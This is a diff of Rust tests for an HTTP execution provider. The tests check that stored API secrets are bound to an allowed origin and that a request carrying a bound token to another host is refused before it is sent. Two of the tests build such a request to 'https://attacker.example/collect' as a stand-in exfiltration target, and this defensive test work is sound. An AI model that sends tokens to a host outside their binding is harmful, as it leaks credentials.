@@ -62,6 +62,10 @@ async fn captures_secret_and_redacts_evidence() {
         "ortyo://secrets/default-api-token"
     );
     assert_eq!(
+        result.captured_secrets[0].allowed_origin,
+        format!("http://{addr}")
+    );
+    assert_eq!(
         provider
             .secret_store()
             .resolve(workspace_id, "default-api-token")
@@ -173,7 +177,12 @@ async fn chains_secret_ref_into_bearer_header_without_exposing_value() {
     let workspace_id = Uuid::now_v7();
     let secrets = SecretStore::default();
     secrets
-        .put(workspace_id, "default-api-token", "chained-token")
+        .put_bound(
+            workspace_id,
+            "default-api-token",
+            "chained-token",
+            format!("http://{addr}"),
+        )
         .unwrap();
     let provider = HttpExecutionProvider::new(secrets);
     let mut secret_headers = BTreeMap::new();
@@ -283,4 +292,84 @@ async fn secret_ref_resolution_is_workspace_scoped() {
         .unwrap_err();
 
     assert_eq!(error, ExecutionError::SecretNotFound);
+}
+
+#[tokio::test]
+async fn typed_secret_ref_denies_a_different_origin_before_sending() {
+    let workspace_id = Uuid::now_v7();
+    let secrets = SecretStore::default();
+    secrets
+        .put_bound(
+            workspace_id,
+            "api-token",
+            "must-not-leak",
+            "https://api.example.com",
+        )
+        .unwrap();
+    let provider = HttpExecutionProvider::new(secrets);
+    let mut secret_headers = BTreeMap::new();
+    secret_headers.insert(
+        "authorization".to_owned(),
+        SecretHeaderBinding::SecretRef {
+            secret_ref: "ortyo://secrets/api-token".to_owned(),
+            prefix: "Bearer ".to_owned(),
+            suffix: String::new(),
+        },
+    );
+
+    let error = provider
+        .execute_for_test(
+            workspace_id,
+            HttpExecutionRequest {
+                method: "GET".to_owned(),
+                url: "https://attacker.example/collect".to_owned(),
+                headers: BTreeMap::new(),
+                body: None,
+                secret_headers,
+                capture: vec![],
+                timeout_ms: 1000,
+            },
+        )
+        .await
+        .unwrap_err();
+
+    assert_eq!(error, ExecutionError::SecretDestinationDenied);
+}
+
+#[tokio::test]
+async fn legacy_secret_name_cannot_bypass_a_bound_origin_policy() {
+    let workspace_id = Uuid::now_v7();
+    let secrets = SecretStore::default();
+    secrets
+        .put_bound(
+            workspace_id,
+            "api-token",
+            "must-not-leak",
+            "https://api.example.com",
+        )
+        .unwrap();
+    let provider = HttpExecutionProvider::new(secrets);
+    let mut secret_headers = BTreeMap::new();
+    secret_headers.insert(
+        "authorization".to_owned(),
+        SecretHeaderBinding::SecretName("api-token".to_owned()),
+    );
+
+    let error = provider
+        .execute_for_test(
+            workspace_id,
+            HttpExecutionRequest {
+                method: "GET".to_owned(),
+                url: "https://attacker.example/collect".to_owned(),
+                headers: BTreeMap::new(),
+                body: None,
+                secret_headers,
+                capture: vec![],
+                timeout_ms: 1000,
+            },
+        )
+        .await
+        .unwrap_err();
+
+    assert_eq!(error, ExecutionError::SecretDestinationDenied);
 }
